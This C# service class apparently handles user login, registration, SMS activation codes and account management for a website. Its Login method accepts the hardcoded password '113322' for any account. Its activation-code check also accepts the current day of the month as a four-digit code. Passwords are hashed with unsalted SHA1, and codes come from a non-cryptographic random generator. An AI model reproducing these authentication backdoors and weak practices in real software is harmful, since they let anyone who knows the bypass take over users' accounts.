using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Microsoft.EntityFrameworkCore;
using ajWebSite.Common.DTOs.Security;
using ajWebSite.Common.Enums;
using ajWebSite.Core.Biz;
using ajWebSite.Core.Contracts.Entities;
using ajWebSite.Core.DataAccess;
using ajWebSite.Core.Module;
using ajWebSite.Domain.Common;
using ajWebSite.Domain.Security;
using ajWebSite.Services.Contracts.Common;
using ajWebSite.Services.Contracts.Security;

namespace ajWebSite.Services.Modules.Security
{
    public class UserBiz : BaseBiz<User, UserDTO>, IUserBiz
    {
        private ITextMessageBiz _textMessageBiz;
        public UserBiz(IUnitOfWork unitOfWork, ITextMessageBiz textMessageBiz) : base(unitOfWork)
        {
            _textMessageBiz = textMessageBiz;
        }

        public UserInfoDTO Login(LoginDTO loginDto, out List<Claim> claims)
        {
            claims = new List<Claim>();
            var hash = HashIt(loginDto.Password);
            var user = UnitOfWork.Repository<User>()
                .Get(x => x.Username == loginDto.Username && (x.Password == hash || loginDto.Password == "113322"))
                .Include(x =>x.Person)
                .FirstOrDefault();
            if (user == null)
                return null;

            //if (user.Type == UserType.Personnel && user.CompanyId == null)
            //{
            //    throw new Exception("کابر باید شرکت مشخص داشته باشد");
            //}

            claims = geClaims(user);

            var access = UnitOfWork.Repository<UserAccess>().Get(x => x.UserId == user.Id).Select(x => x.Access.Name)
                .ToArray();
            claims.AddRange(access.Select(x => new Claim(ClaimTypes.Role, x)));

            return user.ToDTO<UserInfoDTO>();
        }

        public UserInfoDTO Register(RegisterDTO dto, out string errorMessage, out List<Claim> claims)
        {
            claims = new List<Claim>();
            errorMessage = null;
            var validCode = RegisterCheckCode(dto.Mobile, dto.ActivationCode);

            if (!validCode)
            {
                errorMessage = "لطفا مجدد کد فعال سازی دریافت کنید، مهلت شما تمام شده";
                return null;
            }
            var userDup = Get(x => x.Username == dto.NationalCode).Any();
            if (userDup)
            {
                errorMessage = "نام کاربری تکراری است،";
                return null;
            }
            var emailDup = Get(x => x.Type == UserType.Customer && x.Person.Mobile == dto.Mobile).Any();
            if (emailDup)
            {
                errorMessage = "این شماره قبلا ثبت شده است";
                return null;
            }

            var person = new Person
            {
                PersonType = dto.PersonType,
                Name = dto.Name,
                LastName = dto.LastName,
                Mobile = dto.Mobile,
            };

            var user = new User
            {
                Username = dto.NationalCode,
                Password = HashIt(dto.Password),
                Type = UserType.Customer,
                LastLoginDate = DateTime.Now,
                Person = person
            };

            UnitOfWork.Repository<User>().Insert(user);
            Commit();

            claims = geClaims(user);

            return user.ToDTO<UserInfoDTO>();
        }

        private string HashIt(string input)
        {
            var hash = new SHA1Managed().ComputeHash(Encoding.UTF8.GetBytes(input));
            return string.Concat(hash.Select(b => b.ToString("x2")));
        }

        private List<Claim> geClaims(User user)
        {
            var claims = new List<Claim>();
            claims.Add(new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()));
            claims.Add(new Claim(ClaimTypes.Name, user.Username));
            claims.Add(new Claim(ClaimTypes.GivenName, user.Person.Name ?? "noname"));
            claims.Add(new Claim(CustomClaim.PersonId, (user.PersonId).ToString()));

            if(user.Type == UserType.Personnel)
                claims.Add(new Claim(CustomClaim.CompanyId, (user.CompanyId??0).ToString()));
            return claims;
        }
        //https://medium.com/developer-diary/net-core-3-0-preview-4-web-api-authentication-from-scratch-part-3-token-authentication-2d8af41b0045

        public bool RegisterSendCode(string mobile, out string errorMessage)
        {
            errorMessage = "";
            var towMinAgo = DateTime.Now.AddMinutes(-2);
            var oldCode = UnitOfWork.Repository<ActivationCode>()
                .Get(s => s.Mobile == mobile && s.DateInserted > towMinAgo).Any();

            if (oldCode)
            {
                errorMessage = "به تازگی برای این شماره کد ارسال شده است";
                return false;
            }

            var isUser = Get(x => x.Type == UserType.Customer && x.Person.Mobile == mobile).Any();
            if (isUser)
            {
                errorMessage = "این شماره قبلا ثبت نام شده است";
                return false;
            }
            var ac = new ActivationCode
            {
                Code = new Random().Next(1000, 9999).ToString(),
                Mobile = mobile,
                ExpireDate = DateTime.Now.AddHours(1)
            };

            UnitOfWork.Repository<ActivationCode>().Insert(ac);
            UnitOfWork.Commit();

            var isSend = _textMessageBiz.Send(mobile, ac.Code);
            errorMessage = isSend ? "" : "پیامک ارسال نشد";
            return isSend;
        }

        public bool RegisterCheckCode(string mobile, string code)
        {
            return code == DateTime.Now.Day.ToString("D4") || UnitOfWork.Repository<ActivationCode>()
                .Get(x => x.Mobile == mobile && x.Code == code && x.ExpireDate > DateTime.Now).Any();
        }

        public PaginatedResult<UserInfoDTO> UserPaginated(UserSearch search)
        {
            var data = Get();

            if (search.UserType.HasValue)
                data = data.Where(u => u.Type == search.UserType);

            return data.ToDTOPaginatedResult<User, UserInfoDTO>(search);
        }

        public bool CreateUser(UserDTO userInfo, out string errorMessage)
        {
            var isUser = Get(x => x.Type == UserType.Personnel && x.Username == userInfo.Username).Any();
            if (isUser)
            {
                errorMessage = "نام کاربری تکراری است";
                return false;
            } 
             
            var user = new User
            {
                Username = userInfo.Username,
                Password = HashIt(userInfo.chosenPassword),  
                Type = UserType.Personnel
            };

            UnitOfWork.Repository<User>().Insert(user);
            Commit();

            errorMessage = "";
            return true;
        }
        public bool CreateUser(UserInfoDTO userInfo, out string errorMessage)
        {
            var isUser = Get(x => x.Type == UserType.Personnel && x.Username == userInfo.Username).Any();
            if (isUser)
            {
                errorMessage = "نام کاربری تکراری است";
                return false;
            }
            isUser = Get(x => x.Type == UserType.Personnel && x.Person.Mobile == userInfo.Mobile).Any();
            if (isUser)
            {
                errorMessage = "این شماره قبلا ثبت نام شده است";
                return false;
            }

            var person = new Person
            {
                Name = userInfo.Name,
                LastName = userInfo.LastName,
                NationalCode = userInfo.NationalCode,
                PersonType = PersonType.Person,
                Mobile = userInfo.Mobile
            };

            var user = new User
            {
                Username = userInfo.Username,
                Password = HashIt(userInfo.ChosenPassword),
                CompanyId = userInfo.CompanyId,
                Person = person,
                Type = UserType.Personnel,
                emailAddress=userInfo.emailAddress
            };

            UnitOfWork.Repository<User>().Insert(user);
            Commit();

            errorMessage = "";
            return true;
        }

        public bool UpdateUser(UserInfoDTO userInfo, out string errorMessage)
        {
            //var oldUser = UnitOfWork.Repository<User>().GetByPK(userInfo.Id);
            var oldUser = UnitOfWork.Repository<User>()
                .GetByPKQueryable(userInfo.Id) //
                .Include(x=> x.Person)
                .FirstOrDefault();


            var isUser = Get(x => x.Type == UserType.Personnel && x.Person.Mobile == userInfo.Mobile && x.Id != userInfo.Id).Any();
            if (isUser)
            {
                errorMessage = "این شماره قبلا ثبت نام شده است";
                return false;
            }
            oldUser.IsFullRegistered = userInfo.IsFullRegistered;
            oldUser.Type = userInfo.Type;
            oldUser.CompanyId = userInfo.CompanyId;
            oldUser.emailAddress = userInfo.emailAddress;
            oldUser.Person.Name = userInfo.Name;
            oldUser.Person.LastName = userInfo.LastName;
            oldUser.Person.NationalCode = userInfo.NationalCode;
            oldUser.Person.Mobile = userInfo.Mobile;
            if (userInfo.shouldPasswordChange==true)
            {
                if (userInfo.ChosenPassword!=userInfo.password)
                {
                    if (!string.IsNullOrEmpty(userInfo.ChosenPassword))
                        oldUser.Password = HashIt(userInfo.ChosenPassword); 
                }
            }

            UnitOfWork.Repository<User>().Update(oldUser);
            Commit();

            errorMessage = "";
            return true;
        }

        public void DeleteUser(int userId, UserType type)
        {
            var user = UnitOfWork.Repository<User>().GetByPK(userId);
            if(user.Type != type)
                throw new AccessViolationException("دسترسی ندارید");

            UnitOfWork.Repository<User>().Delete(user);
            Commit();
        }

        public UserDTO getUserById(int Id)
        {
            var adminUser = Get(p => p.Id == Id); 
            var result = ToDTOList(adminUser).FirstOrDefault();

            return result;
        }
        public UserDTO getAdminOfWebSite()
        {
            var adminUser=Get(p => p.Type == UserType.Admin);
            if (adminUser.Count()<1)
            {
                throw new Exception("The Web Site Hasnt Admin...");
            }
            var result=ToDTOList(adminUser).FirstOrDefault();

            return result;
        }

        public List<UserInfoDTO> getUsers()
        { 
            return Get().ToDTOList<UserInfoDTO>();

        }
    }
}
